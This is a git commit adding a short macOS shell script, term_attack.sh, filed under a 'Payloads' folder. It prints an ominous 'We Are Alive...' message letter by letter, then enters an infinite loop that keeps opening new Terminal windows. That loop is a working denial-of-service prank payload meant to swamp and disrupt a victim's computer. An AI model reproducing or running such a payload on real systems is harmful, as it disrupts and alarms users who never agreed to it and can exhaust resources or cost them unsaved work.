25226ae1aeb0bb480790f8b20fa66cb0a62c71cd
For-b <ffranzen@greatriverschool.org>
2018-12-19 19:20:35 -0800

    fixed

---
+++ Extras/Bup0/Payloads/term_attack.sh
@@ -0,0 +1,43 @@
+clear
+echo W
+sleep .2
+clear
+echo We
+sleep .2
+clear
+echo We A
+sleep .2
+clear
+echo We Ar
+sleep .2
+clear
+echo We Are
+sleep .2
+clear
+echo We Are A
+sleep .2
+clear
+echo We Are Al
+sleep .2
+clear
+echo We Are Ali
+sleep .2
+clear
+echo We Are Aliv
+sleep .2
+clear
+echo We Are Alive
+sleep 2
+clear
+echo We Are Alive.
+sleep 1
+clear
+echo We Are Alive..
+sleep 1
+clear
+echo We Are Alive...
+sleep 1
+
+while true; do
+  open -a Terminal "`pwd`"
+done
